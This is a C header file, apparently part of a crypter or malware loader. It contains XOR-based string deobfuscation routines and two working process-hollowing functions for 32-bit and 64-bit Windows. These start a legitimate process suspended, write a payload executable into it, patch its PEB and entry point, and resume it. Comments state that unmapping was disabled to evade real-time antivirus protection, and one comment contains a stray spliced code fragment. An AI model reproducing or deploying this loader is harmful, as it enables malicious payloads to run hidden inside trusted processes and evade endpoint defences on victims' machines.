#pragma once

#include <windows.h>
#include <string.h>
#include "relocate.h"


unsigned char* deobfuscate(unsigned char *address, long len, unsigned char keyByte) {
	for(long i=0; i < len; i++) {
		address[i] = address[i] ^ keyByte;
	}
	return address;
}

void altDeobfuscate(unsigned char* address, long len, unsigned char keyByte0, unsigned char keyByte1) {
	unsigned int imod = 0;
	unsigned int keymod = 0;
	unsigned char savedBits = 0;
	
	for(long i=0; i < len; i++) {
		imod = i%4;
		switch(imod) {
			case 0:
				// XOR - XOR (keyByte0)
				address[i] = address[i] ^ keyByte0;
				break;
			case 1:
				// INC - DEC				
				address[i] = address[i] - 1;				
				break;
			case 2:
				// NOT - NOT
				address[i] = address[i] ^ 0xFF; 
				break;
			case 3:
				// Compute keymod = keyByte1 mod 8
				// Swap the keymod leftmost bits with the other bits of the byte
				keymod = keyByte1 % 8;
				savedBits = address[i] >> (8 - keymod);
				address[i] = address[i] << keymod;
				address[i] = address[i] ^ savedBits;
				break;
			default:
				// default case should never happen - do nothing
				break;
		}
	}
}


// typedef LONG (WINAPI *NtUnmapViewOfSection) (HANDLE ProcessHandle, PVOID BaseAddress);

#ifndef X64
void newRunPE32(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
	// NtUnmapViewOfSection callNtUnmapViewOfSection;
	STARTUPINFOA targetStartupInfo;
	PROCESS_INFORMATION targetProcessInfo;
	PIMAGE_DOS_HEADER payloadDosHeader;
	PIMAGE_NT_HEADERS payloadNtHeader;
	PIMAGE_SECTION_HEADER payloadSectionHeader;
	CONTEXT targetContext;
	DWORD oldTargetImageBase;
	DWORD newTargetImageBase;
	DWORD desiredPayloadImageBase;
	LPVOID localPayloadCopy;
		
	// Obfuscated function name string (keyByte is 0x45)	
	// unsigned char obfuscatedNtUnmapViewOfSection[21] = {0x0b, 0x31, 0x10, 0x2b, 0x28, 0x24, 0x35, 0x13, 0x2c, 0x20, 0x32, 0x0a, 0x23, 0x16, 0x20, 0x26, 0x31, 0x2c, 0x2a, 0x2b, 0x45};
	
	// Obfuscated library name string (keyByte is 0x56)
	unsigned char obfuscatedNtDll[10] = {0x38, 0x22, 0x32, 0x3a, 0x3a, 0x78, 0x32, 0x3a, 0x3a, 0x56};
	
	// Init info structures for target process instanciation
	RtlZeroMemory(&targetStartupInfo, sizeof(targetStartupInfo));
	RtlZeroMemory(&targetProcessInfo, sizeof(targetProcessInfo));
	
	// Create new instance of target process
	if(!CreateProcessA(targetPath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &targetStartupInfo, &targetProcessInfo)) {
		DEBUG_PRINT(("Failed to create target process.\n"));
		return;
	} else {
		DEBUG_PRINT(("Target process instanciated.\n"));
	}
	
	// Get thread context of target process
	targetContext.ContextFlags = CONTEXT_FULL;
	if(GetThreadContext(targetProcessInfo.hThread, (LPCONTEXT) &targetContext) == 0) {
		DEBUG_PRINT(("GetThreadContext for target process main thread failed.\n"));
		return;
	} else {
		DEBUG_PRINT(("Retrieved target main thread context.\n"));
	}
	
	// Get payload headers
	payloadDosHeader = (PIMAGE_DOS_HEADER) payloadData;
	payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);	
	
	// Patch payload subsystem to avoid crashes
	payloadNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;	
	
	// Get target process image base (ebx = PEB base address)
	if(ReadProcessMemory(targetProcessInfo.hProcess, (LPCVOID) (targetContext.Ebx + 8), (LPVOID) (&oldTargetImageBase), sizeof(DWORD), NULL) == 0)	{
		DEBUG_PRINT(("Failed to read target process image base from PEB at address 0x%lX\n", targetContext.Ebx + 8));
		return;
	} else {
		DEBUG_PRINT(("Old target process image base is 0x%lX\n", oldTargetImageBase));	
	}
			
	// Section unmapping disabled to appear more stealthy against real time protection
	// Unmap old target process image (always)		
	//callNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA(deobfuscate(obfuscatedNtDll, 10, 0x56)), deobfuscate(obfuscatedNtUnmapViewOfSection, 21, 0x45)));
	//if(callNtUnmapViewOfSection(targetProcessInfo.hProcess, (PVOID) oldTargetImageBase) == ERROR_SUCCESS) {
	//	DEBUG_PRINT(("Unmapped old target process image.\n"));
	//} else {
	//	DEBUG_PRINT(("Failed to unmap old target process image.\n"));
	//	return;
	//}	
	
	desiredPayloadImageBase = payloadNtHeader->OptionalHeader.ImageBase;
	DEBUG_PRINT(("Desired image base of payload is 0x%lX\n", payloadNtHeader->OptionalHeader.ImageBase));	
	
	// Try to allocate memory in target process
	DEBUG_PRINT(("Trying to allocate memory in target process...\n"));
	
	// Payload can handle relocations - let the OS decide where to map the payload
	if(has_relocations(payloadData)) {
		DEBUG_PRINT(("Found reloc section in payload executable. Choosing dynamic base allocation.\n"));
		newTargetImageBase = (DWORD) VirtualAllocEx(targetProcessInfo.hProcess, NULL, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	// Payload can't handle relocations: Try to get the desired image base. Procedure will fail if this address is unavailable
	} else {
		DEBUG_PRINT(("Payload has no reloc section and must use fixed image base.\n"));		
		newTargetImageBase = (DWORD) VirtualAllocEx(targetProcessInfo.hProcess, (LPVOID) desiredPayloadImageBase, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}
		
	if(newTargetImageBase == 0) {		
		DEBUG_PRINT(("Failed to allocate memory.\n"));
		return;
	} else {
		DEBUG_PRINT(("Allocated memory in target process!\n"));
	}
		
	// Arbitary allocation successful
	DEBUG_PRINT(("New memory region has size 0x%lX bytes, at address 0x%lX.\n", payloadNtHeader->OptionalHeader.SizeOfImage, newTargetImageBase));
		
	// Fix image base in payload optional header to where memory could be actually allocated in target process
	payloadNtHeader->OptionalHeader.ImageBase = newTargetImageBase;
	DEBUG_PRINT(("Adjusted OptionalHeader.ImageBase in payload to point to the actually allocated memory in target process.\n"));
	
	// Allocate local buffer in which the image can be prepared
	localPayloadCopy = VirtualAlloc(NULL, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	if(localPayloadCopy == 0) {
		DEBUG_PRINT(("Failed to allocate local memory for image preparation.\n"));
		return;
	} else {
		DEBUG_PRINT(("Allocated local memory to prepare payload image before copying.\n"));
	}
	
	// Fill local copy with section headers and section data
	memcpy(localPayloadCopy, payloadData, payloadNtHeader->OptionalHeader.SizeOfHeaders);
	DEBUG_PRINT(("Wrote payload headers into local copy.\n"));
	
	for(int i = 0; i < payloadNtHeader->FileHeader.NumberOfSections; i++) {
		payloadSectionHeader = (PIMAGE_SECTION_HEADER) ((BYTE *) payloadNtHeader + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		
		// No checking for SizeOfRawData == 0 needed because memcpy automatically skips copying without generating errors in that case
		memcpy((BYTE *) localPayloadCopy + payloadSectionHeader->VirtualAddress, (BYTE *) payloadData + payloadSectionHeader->PointerToRawData, payloadSectionHeader->SizeOfRawData);
		DEBUG_PRINT(("Wrote section %d to local copy, virtual address offset of section is 0x%lX.\n", i, payloadSectionHeader->VirtualAddress));		
	}	
	
	// Apply relocations if VirtualAllocEx did not deliver the desired image base address
	if(newTargetImageBase != desiredPayloadImageBase) {
		DEBUG_PRINT(("Payload not mapped at desired image base, applying relocations...\n"));
		if(apply_relocations((ULONGLONG) newTargetImageBase, (ULONGLONG) desiredPayloadImageBase, localPayloadCopy) == false) {
			DEBUG_PRINT(("Applying relocations to local copy failed.\n"));
			return;
		} else {
			DEBUG_PRINT(("Applied relocations to local payload copy.\n"));
		}
	} else {
		DEBUG_PRINT(("Image is at desired base, skipping relocations.\n"));
	}
		
	// Image prepared. Write the local copy into the target process
	if(WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) newTargetImageBase, localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, NULL) == 0) {
		DEBUG_PRINT(("Failed to write local payload copy into target process.\n"));
		return;
	} else {
		DEBUG_PRINT(("Wrote local payload copy into target process.\n"));
	}
		
	// Fix image base in target PEB (ebx = PEB base address)
	if(WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) (targetContext.Ebx + 8), (LPCVOID) &newTargetImageBase, sizeof(DWORD), NULL) == 0) {
		DEBUG_PRINT(("Failed to fix target image base in PEB.\n"));
		return;
	} else { 
		DEBUG_PRINT(("Fixed target image base in PEB to 0x%lX\n", newTargetImageBase));
	}	
	
	// Set new entry point in target main thread context
	targetContext.Eax = newTargetImageBase + payloadNtHeader->OptionalHeader.AddressOfEntryPoint;
	if(!SetThreadContext(targetProcessInfo.hThread, &targetContext)) {
		DEBUG_PRINT(("Setting thread context for target main thread failed.\n"));
		return;
	} else {
		DEBUG_PRINT(("Set thread context for target main thread. New entry point is 0x%lX.\n", targetContext.Eax));
	}
	
	// Free the local payload copy
	VirtualFree(localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_FREE);	
	
	// Resume main thread of target process
	if(ResumeThread(targetProcessInfo.hThread) == -1) {
		DEBUG_PRINT(("Failed to resume target main thread.\n"));
	} else {
		DEBUG_PRINT(("Resumed target main thread.\n"));
	}
	
	// Cleanup
	CloseHandle(targetProcessInfo.hThread);
	CloseHandle(targetProcessInfo.hProcess);
}
#endif

#ifdef X64
void newRunPE64(LPSTR targetPath, PVOID payloadData, LPTSTR commandLine) {
	// NtUnmapViewOfSection callNtUnmapViewOfSection;
	STARTUPINFOA targetStartupInfo;
	PROCESS_INFORMATION targetProcessInfo;
	PIMAGE_DOS_HEADER payloadDosHeader;
	PIMAGE_NT_HEADERS payloadNtHeader;
	PIMAGE_SECTION_HEADER payloadSectionHeader;
	CONTEXT targetContext;
	DWORD64 oldTargetImageBase;
	DWORD64 newTargetImageBase;
	DWORD64 desiredPayloadImageBase;
	LPVOID localPayloadCopy;	
	
	// Obfuscated function name string (keyByte is 0x45)
	// unsigned char obfuscatedNtUnmapViewOfSection[21] = {0x0b, 0x31, 0x10, 0x2b, 0x28, 0x24, 0x35, 0x13, 0x2c, 0x20, 0x32, 0x0a, 0x23, 0x16, 0x20, 0x26, 0x31, 0x2c, 0x2a, 0x2b, 0x45};
	
	// Obfuscated library name string (keyByte is 0x56)
	unsigned char obfuscatedNtDll[10] = {0x38, 0x22, 0x32, 0x3a, 0x3a, 0x78, 0x32, 0x3a, 0x3a, 0x56};
	
	// Init info structures for target process instanciation
	RtlZeroMemory(&targetStartupInfo, sizeof(targetStartupInfo));
	RtlZeroMemory(&targetProcessInfo, sizeof(targetProcessInfo));
	
	// Create new instance of target process
	if(!CreateProcessA(targetPath, commandLine, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &targetStartupInfo, &targetProcessInfo)) {
		DEBUG_PRINT(("Failed to create target process.\n"));
		return;
	} else {
		DEBUG_PRINT(("Target process instanciated.\n"));
	}
	
	// Get thread context of target process
	targetContext.ContextFlags = CONTEXT_FULL;
	if(GetThreadContext(targetProcessInfo.hThread, (LPCONTEXT) &targetContext) == 0) {
		DEBUG_PRINT(("GetThreadContext for target process main thread failed.\n"));
		return;
	} else {
		DEBUG_PRINT(("Retrieved target main thread context.\n"));
	}
	
	// Get payload headers
	payloadDosHeader = (PIMAGE_DOS_HEADER) payloadData;
	payloadNtHeader = (PIMAGE_NT_HEADERS) ((BYTE *) payloadDosHeader + payloadDosHeader->e_lfanew);	
	
	// Patch payload subsystem to avoid crashes
	payloadNtHeader->OptionalHeader.Subsystem = IMAGE_SUBSYSTEM_WINDOWS_GUI;	
	
	// Get target process image base (rdx = PEB base address)
	if(ReadProcessMemory(targetProcessInfo.hProcess, (LPCVOID) (targetContext.Rdx + 16), (LPVOID) (&oldTargetImageBase), sizeof(DWORD64), NULL) == 0)	{
		DEBUG_PRINT(("Failed to read target process image base from PEB at address 0x%llX\n", targetContext.Rdx + 16));
		return;
	} else {
		DEBUG_PRINT(("Old target process image base is 0x%llX\n", oldTargetImageBase));	
	}
	
	// Section unmapping disabled to appear more stealthy against real time protection
	// Unmap old target process image (always)	
	// callNtUnmapViewOfSection = (NtUnmapViewOfSection)(GetProcAddress(GetModuleHandleA(deobfuscate(obfuscatedNtDll, 10, 0x56)), deobfuscate(obfuscatedNtUnmapViewOfSection, 21, 0x45)));
	// if(callNtUnmapViewOfSection(targetProcessInfo.hProcess, (PVOID) oldTargetImageBase) == ERROR_SUCCESS) {
	// 	DEBUG_PRINT(("Unmapped old target process image.\n"))
	// } else {
	//	DEBUG_PRINT((Failed to unmap old target process image.\n"))
	//	return;
	// }	
	
	desiredPayloadImageBase = payloadNtHeader->OptionalHeader.ImageBase;
	DEBUG_PRINT(("Desired image base of payload is 0x%llX\n", payloadNtHeader->OptionalHeader.ImageBase));	
	
	// Try to allocate memory in target process
	DEBUG_PRINT(("Trying to allocate memory in target process...\n"));
	
	// Payload can handle relocations - let the OS decide where to map the payload
	if(has_relocations(payloadData)) {
		DEBUG_PRINT(("Found reloc section in payload executable. Choosing dynamic base allocation.\n"));
		newTargetImageBase = (DWORD64) VirtualAllocEx(targetProcessInfo.hProcess, NULL, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	// Payload can't handle relocations: Try to get the desired image base. Procedure will fail if this address is unavailable
	} else {
		DEBUG_PRINT(("Payload has no reloc section and must use fixed image base.\n"));		
		newTargetImageBase = (DWORD64) VirtualAllocEx(targetProcessInfo.hProcess, (LPVOID) desiredPayloadImageBase, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	}
		
	if(newTargetImageBase == 0) {		
		DEBUG_PRINT(("Failed to allocate memory.\n"));
		return;
	} else {
		DEBUG_PRINT(("Allocated memory in target process!\n"));
	}
		
	// Arbitary allocation successful
	DEBUG_PRINT(("New memory region has size 0x%lX bytes, at address 0x%llX.\n", payloadNtHeader->OptionalHeader.SizeOfImage, newTargetImageBase));
		
	// Fix image base in payload optional header to where memory could be actually allocated in target process
	payloadNtHeader->OptionalHeader.ImageBase = newTargetImageBase;
	DEBUG_PRINT(("Adjusted OptionalHeader.ImageBase in payload to point to the actually allocated memory in target process.\n"));
	
	// Allocate local buffer in which the image can be prepared
	localPayloadCopy = VirtualAlloc(NULL, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	
	if(localPayloadCopy == 0) {
		DEBUG_PRINT(("Failed to allocate local memory for image preparation.\n"));
		return;
	} else {
		DEBUG_PRINT(("Allocated local memory to prepare payload image before copying.\n"));
	}
	
	// Fill local copy with section headers and section data
	memcpy(localPayloadCopy, payloadData, payloadNtHeader->OptionalHeader.SizeOfHeaders);
	DEBUG_PRINT(("Wrote payload headers into local copy.\n"));
	
	for(int i = 0; i < payloadNtHeader->FileHeader.NumberOfSections; i++) {
		payloadSectionHeader = (PIMAGE_SECTION_HEADER) ((BYTE *) payloadNtHeader + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
		
		// No checking for SizeOfRawData == 0 needed because memcpy automatically skips copying printf("\ttype 10");without generating errors in that case
		memcpy((BYTE *) localPayloadCopy + payloadSectionHeader->VirtualAddress, (BYTE *) payloadData + payloadSectionHeader->PointerToRawData, payloadSectionHeader->SizeOfRawData);
		DEBUG_PRINT(("Wrote section %d to local copy, virtual address offset of section is 0x%lX.\n", i, payloadSectionHeader->VirtualAddress));		
	}	
	
	// Apply relocations if VirtualAllocEx did not deliver the desired image base address
	if(newTargetImageBase != desiredPayloadImageBase) {
		DEBUG_PRINT(("Payload not mapped at desired image base, applying relocations...\n"));
		if(apply_relocations((ULONGLONG) newTargetImageBase, (ULONGLONG) desiredPayloadImageBase, localPayloadCopy) == false) {
			DEBUG_PRINT(("Applying relocations to local copy failed.\n"));
			return;
		} else {
			DEBUG_PRINT(("Applied relocations to local payload copy.\n"));
		}
	} else {
		DEBUG_PRINT(("Image is at desired base, skipping relocations.\n"));
	}
		
	// Image prepared. Write the local copy into the target process
	if(WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) newTargetImageBase, localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, NULL) == 0) {
		DEBUG_PRINT(("Failed to write local payload copy into target process.\n"));
		return;
	} else {
		DEBUG_PRINT(("Wrote local payload copy into target process.\n"));
	}
		
	// Fix image base in target PEB (rdx = PEB base address)
	if(WriteProcessMemory(targetProcessInfo.hProcess, (LPVOID) (targetContext.Rdx + 16), (LPCVOID) &newTargetImageBase, sizeof(DWORD64), NULL) == 0) {
		DEBUG_PRINT(("Failed to fix target image base in PEB.\n"));
		return;
	} else { 
		DEBUG_PRINT(("Fixed target image base in PEB to 0x%llX\n", newTargetImageBase));
	}	
	
	// Set new entry point in target main thread context
	targetContext.Rcx = newTargetImageBase + payloadNtHeader->OptionalHeader.AddressOfEntryPoint;
	if(!SetThreadContext(targetProcessInfo.hThread, &targetContext)) {
		DEBUG_PRINT(("Setting thread context for target main thread failed.\n"));
		return;
	} else {
		DEBUG_PRINT(("Set thread context for target main thread. New entry point is 0x%llX.\n", targetContext.Rcx));
	}
	
	// Free the local payload copy
	VirtualFree(localPayloadCopy, payloadNtHeader->OptionalHeader.SizeOfImage, MEM_FREE);	
	
	// Resume main thread of target process
	if(ResumeThread(targetProcessInfo.hThread) == -1) {
		DEBUG_PRINT(("Failed to resume target main thread.\n"));
	} else {
		DEBUG_PRINT(("Resumed target main thread.\n"));
	}
	
	// Cleanup
	CloseHandle(targetProcessInfo.hThread);
	CloseHandle(targetProcessInfo.hProcess);
}
#endif